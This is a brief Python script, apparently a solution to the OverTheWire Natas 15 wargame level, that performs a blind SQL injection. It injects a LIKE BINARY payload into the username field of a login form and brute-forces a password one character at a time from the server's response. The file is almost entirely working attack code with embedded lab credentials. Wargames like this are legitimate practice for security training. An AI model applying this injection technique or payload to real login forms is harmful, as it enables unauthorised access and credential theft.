import requests					#i woulda made this better but i needa study so jus
from requests.auth import HTTPBasicAuth		#let it go til it stops finding new characters in it
chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
auth=HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
pw='T'
c=0
while c<1:
	for i in chars:
		val= 'natas16" and password LIKE BINARY "'+pw+i+'%"; #'
		dat={'username':val}
		req=requests.post('http://natas15.natas.labs.overthewire.org/index.php',data=dat,auth=auth,headers={"Authorization":"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="})
		if "This user exists" in str(req.content):
			pw=pw+i
			print(pw)
